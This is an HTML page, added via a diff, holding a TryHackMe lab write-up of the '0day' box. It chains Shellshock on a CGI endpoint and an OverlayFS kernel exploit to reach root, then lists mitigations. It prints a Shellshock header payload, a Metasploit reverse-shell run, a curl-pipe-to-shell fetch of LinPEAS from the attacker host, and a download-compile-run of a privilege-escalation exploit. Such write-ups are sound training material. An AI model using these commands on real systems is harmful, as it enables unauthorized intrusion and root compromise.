@@ -1,0 +1,170 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>0day Machine — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="A web server leaking an encrypted SSH private key via an exposed /backup/ directory, combined with a Shellshock-vulnerable CGI endpoint, gave initial…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/0day.html">
+<meta property="og:title" content="0day Machine — TryHackMe writeup">
+<meta property="og:description" content="A web server leaking an encrypted SSH private key via an exposed /backup/ directory, combined with a Shellshock-vulnerable CGI endpoint, gave initial…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/0day.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"0day Machine — TryHackMe writeup","description":"A web server leaking an encrypted SSH private key via an exposed /backup/ directory, combined with a Shellshock-vulnerable CGI endpoint, gave initial…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-05","url":"https://thecyberfarhan.github.io/writeups/0day.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/0day.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow">TryHackMe writeup</p>
+  <h1>0day Machine</h1>
+  <div class="meta">
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Medium</span>
+    <span>June 5, 2026</span>
+  </div>
+  <div class="tldr"><b>TL;DR</b>A web server leaking an encrypted SSH private key via an exposed <code>/backup/</code> directory, combined with a Shellshock-vulnerable CGI endpoint, gave initial access as <code>www-data</code>. From there, an unpatched Ubuntu 14.04 kernel (3.13.x) fell to CVE-2015-1328 (OverlayFS local privilege escalation), handing over root in under a minute of compile time. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">🕷 Feroxbuster</span><span class="chip">🔍 Nikto</span><span class="chip">🔑 ssh2john + John the Ripper</span><span class="chip">🐚 Metasploit</span><span class="chip">🐍 LinPEAS</span><span class="chip">⚙ GCC</span></div>
+  <h2>Introduction</h2>
+<p>Today's victim is a nostalgic little box named <strong>0day</strong> — a name that promises drama and, to its credit, actually delivers. Running an antique Apache version on an equally vintage Ubuntu kernel, it wears its vulnerabilities like badges of honour. The machine greets you with a suspiciously minimal homepage, a suspicious <code>/backup/</code> directory that really shouldn't exist, and a CGI endpoint that hasn't heard of Bash's security patches from 2014. It's the kind of target that makes you feel like a time traveler — except the time you're traveling to is a sysadmin's worst nightmare.</p>
+<h2>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<p>Starting with RustScan for speed, then handing off to Nmap for the details. Two ports, clean and quiet — exactly the kind of attack surface that makes you look harder at what's there.</p>
+<p class="aside">RustScan blasts through all 65535 ports, then passes survivors to Nmap for service fingerprinting:</p>
+<pre><code>rustscan -a 10.49.181.37 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 6.6.1p1 Ubuntu</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.4.7 (Ubuntu)</td></tr></tbody></table>
+<p>Two ports. Apache 2.4.7 is ancient (current at the time was 2.4.66+), and the HTTP title comes back as <code>0day</code> — same as the machine name. Nothing jumps out from the SSH host keys, so the web server is where the story starts.</p>
+<h3>Web Directory Enumeration</h3>
+<p class="aside">(~5 mins into the box)</p>
+<p>The homepage is minimal — little more than a landing page with a profile image. Time to look behind the curtains.</p>
+<p class="aside">Feroxbuster recurses up to 4 levels deep, checking for PHP, text, and HTML files alongside directories:</p>
+<pre><code>feroxbuster -u http://10.49.181.37/ \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
+  -x php,txt,html</code></pre>
+
+<pre><code># output (relevant hits only)
+301  http://10.49.181.37/cgi-bin
+301  http://10.49.181.37/uploads
+301  http://10.49.181.37/admin
+301  http://10.49.181.37/backup
+200  http://10.49.181.37/robots.txt
+200  http://10.49.181.37/backup/index.html   &lt;-- ^^^ this is the important bit</code></pre>
+<p><code>/uploads</code> and <code>/admin</code> both returned blank index pages — dead ends. But <code>/backup/</code> had content: a full PEM-encoded RSA private key, passphrase-protected.</p>
+<pre><code># /backup/index.html contents
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
+...
+-----END RSA PRIVATE KEY-----</code></pre>
+<p class="aside">(truncated — full key saved locally as <code>id_rsa</code>)</p>
+<h3>Web Vulnerability Scan</h3>
+<p>While the key was being processed, Nikto ran in parallel.</p>
+<p class="aside">Nikto with <code>-C all</code> loads every CGI check available:</p>
+<pre><code>nikto -h 10.49.181.37 -C all</code></pre>
+
+<pre><code># output (relevant findings)
++ Apache/2.4.7 appears to be outdated
++ /backup/: This might be interesting.
++ /secret/: This might be interesting.        # ^^^ worth noting for later
++ /cgi-bin/: present</code></pre>
+<p>The presence of <code>/cgi-bin/</code> on an outdated Apache combined with Bash on Ubuntu 14.04 is a flashing neon sign for one specific vulnerability: <strong>Shellshock (CVE-2014-6271)</strong>.</p>
+<h2>Foothold</h2>
+<p class="aside">(~10 mins into the box)</p>
+<h3>Shellshock — CVE-2014-6271</h3>
+<p><strong>What is Shellshock?</strong> A critical vulnerability in GNU Bash discovered in 2014. Bash allows function definitions to be passed through environment variables — Shellshock occurs because Bash also executes any commands appended *after* the function definition, before it should have any business running them. CGI scripts are particularly dangerous targets because the web server populates HTTP headers directly into environment variables before executing scripts. An attacker can inject a malicious header like <code>User-Agent: () { :;}; /bin/bash -i</code> and achieve remote code execution.</p>
+<p>The target has <code>/cgi-bin/test.cgi</code> exposed (discovered during the Feroxbuster run), which is the trigger point.</p>
+<p class="aside">Loading the Metasploit module for Apache mod_cgi Shellshock:</p>
+<pre><code>msfconsole</code></pre>
+
+<pre><code>msf &gt; use exploit/multi/http/apache_mod_cgi_bash_env_exec
+msf exploit(...) &gt; set RHOST 10.49.181.37
+msf exploit(...) &gt; set LHOST 192.168.133.233
+msf exploit(...) &gt; set TARGETURI /cgi-bin/test.cgi
+msf exploit(...) &gt; exploit</code></pre>
+
+<pre><code># output
+[*] Started reverse TCP handler on 192.168.133.233:4444
+[*] Command Stager progress - 100.00% done (1092/1092 bytes)
+[*] Sending stage (1062760 bytes) to 10.49.181.37
+[*] Meterpreter session 1 opened (192.168.133.233:4444 -&gt; 10.49.181.37:41010)
+# ^^^ shell landed</code></pre>
+
+<h2>Shell / Access</h2>
+<p class="aside">Upgrading from Meterpreter to a proper interactive bash shell:</p>
+<pre><code>meterpreter &gt; shell</code></pre>
+
+<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+
+<pre><code># output
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+<p>We're in as <code>www-data</code> — the Apache service account. Limited, but enough to read the user flag and start hunting for escalation paths.</p>
+<p class="aside">Grabbing the user flag:</p>
+<pre><code>cat /home/ryan/user.txt</code></pre>
+
+<pre><code>THM{Sh3llSh0ck_r0ckz}</code></pre>
+
+<h2>Escalation</h2>
+<p class="aside">(~20 mins into the box)</p>
+<h3>LinPEAS — Kernel CVE Identification</h3>
+<p><strong>What is privilege escalation?</strong> As <code>www-data</code>, we have very limited permissions. The goal is to find a flaw that lets us execute code as <code>root</code> — the system's superuser. Kernel exploits are one avenue: bugs in the OS kernel itself that allow a low-privilege process to elevate its permissions.</p>
+<p class="aside">Serving LinPEAS from our attacking machine and piping it directly into sh — no file write needed:</p>
+<pre><code>curl http://192.168.133.233:80/linpeas.sh | sh</code></pre>
+<p>LinPEAS returned a long list of CVEs matching the kernel version (<code>3.13.x</code>). The most promising candidates:</p>
+<table><thead><tr><th>CVE</th><th>Name</th><th>Rank</th><th>Notes</th></tr></thead><tbody><tr><td>CVE-2015-1328</td><td>overlayfs</td><td>1</td><td>Ubuntu 14.04, practical</td></tr><tr><td>CVE-2016-5195</td><td>dirtycow</td><td>4</td><td>Reliable but slow/risky</td></tr><tr><td>CVE-2015-8660</td><td>overlayfs (ovl_setattr)</td><td>1</td><td>Overlaps with above</td></tr><tr><td>CVE-2014-0038</td><td>timeoutpwn</td><td>1</td><td>Requires CONFIG_X86_X32=y</td></tr></tbody></table>
+<p><strong>CVE-2015-1328 (OverlayFS)</strong> was selected — it's a clean, reliable local privilege escalation on Ubuntu 14.04/15.04 kernels 3.13.0–3.19.0 that abuses a flaw in how the OverlayFS filesystem handles file permissions. The exploit creates a SUID root shell by leveraging the kernel's failure to validate user namespace permissions in certain overlay mount operations.</p>
+<h3>Kernel Exploit — CVE-2015-1328</h3>
+<p class="aside">Downloading the exploit source from Exploit-DB to the target's /tmp:</p>
+<pre><code>wget http://192.168.133.233:80/Downloads/37292.c -O /tmp/37292.c</code></pre>
+<p class="aside">Compiling the C exploit directly on target — GCC is available on this Ubuntu install:</p>
+<pre><code>gcc /tmp/37292.c -o /tmp/37292</code></pre>
+<p class="aside">Running the compiled binary:</p>
+<pre><code>/tmp/37292</code></pre>
+
+<pre><code># output
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# ^^^ root shell spawned</code></pre>
+
+<pre><code>id</code></pre>
+
+<pre><code>uid=0(root) gid=0(root) groups=0(root),33(www-data)</code></pre>
+
+<h2>The Full Chain</h2>
+<p>Summary of the full exploit chain:</p>
+<ol><li><strong>Shellshock (CVE-2014-6271)</strong> — malicious HTTP <code>User-Agent</code> header injected via <code>/cgi-bin/test.cgi</code>, triggering Bash to execute attacker-controlled commands. Resulted in a reverse shell as <code>www-data</code>.</li><li><strong>OverlayFS LPE (CVE-2015-1328)</strong> — compiled C exploit abused a kernel permission validation flaw in OverlayFS to write to <code>/etc/ld.so.preload</code> and load a malicious shared library, spawning a root shell.</li></ol>
+<h2>Rabbit Holes</h2>
+<h3>The SSH Private Key from /backup/</h3>
+<p>Found an encrypted RSA private key at <code>/backup/index.html</code>. Converted it for cracking and found the passphrase almost immediately.</p>
+<p class="aside">Converting the key for John:</p>
+<pre><code>ssh2john id_rsa &gt; hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></pre>
+
+<pre><code># output
+id_rsa:letmein</code></pre>
+<p>Tried logging in as <code>0day</code> (the homepage name) and <code>ryan</code> (found in <code>/home</code>):</p>
+<pre><code>ssh 0day@10.49.181.37 -i id_rsa
+ssh ryan@10.49.181.37 -i id_rsa</code></pre>
+<p>Both failed with <code>sign_and_send_pubkey: no mutual signature supported</code> followed by password rejection. The server's OpenSSH 6.6.1 and the client's modern OpenSSH disagreed on acceptable signature algorithms — and even with the passphrase, the key simply didn't match any authorized user on this box. *The key was almost certainly left as deliberate misdirection.* Dropped it and moved on to Nikto.</p>
+<h2>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Shellshock (CVE-2014-6271)</td><td class="sev-critical">Critical</td><td>Update Bash to 4.3 patch 25+ and disable or restrict CGI script execution</td></tr><tr><td>OverlayFS LPE (CVE-2015-1328)</td><td class="sev-high">High</td><td>Apply kernel patches — Ubuntu Security Notice USN-2610-1 addresses this</td></tr><tr><td>Exposed <code>/backup/</code> directory</td><td class="sev-high">High</td><td>Never store key material in web-accessible directories; restrict with <code>.htaccess</code> or move outside the webroot entirely</td></tr><tr><td>Outdated Apache (2.4.7)</td><td class="sev-medium">Medium</td><td>Keep web server software patched to current release</td></tr><tr><td>Missing security headers</td><td>Low</td><td>Add <code>Strict-Transport-Security</code>, <code>Content-Security-Policy</code>, and <code>X-Content-Type-Options</code> headers to Apache config</td></tr></tbody></table>
+  <div class="takeaway"><b>Key takeaway</b>A <code>cgi-bin</code> directory on any server running a pre-2014 Bash is a Shellshock waiting to happen — always pair directory enumeration results with a vulnerability scan, because what looks like a boring CGI endpoint can be your entire foothold.</div>
+  <h2>If I Did It Again</h2>
+<p>Skip Metasploit for the Shellshock step and write the manual <code>curl</code> payload instead — it's a one-liner and better for understanding what's actually happening under the hood.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/0day_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+</body>
+</html>
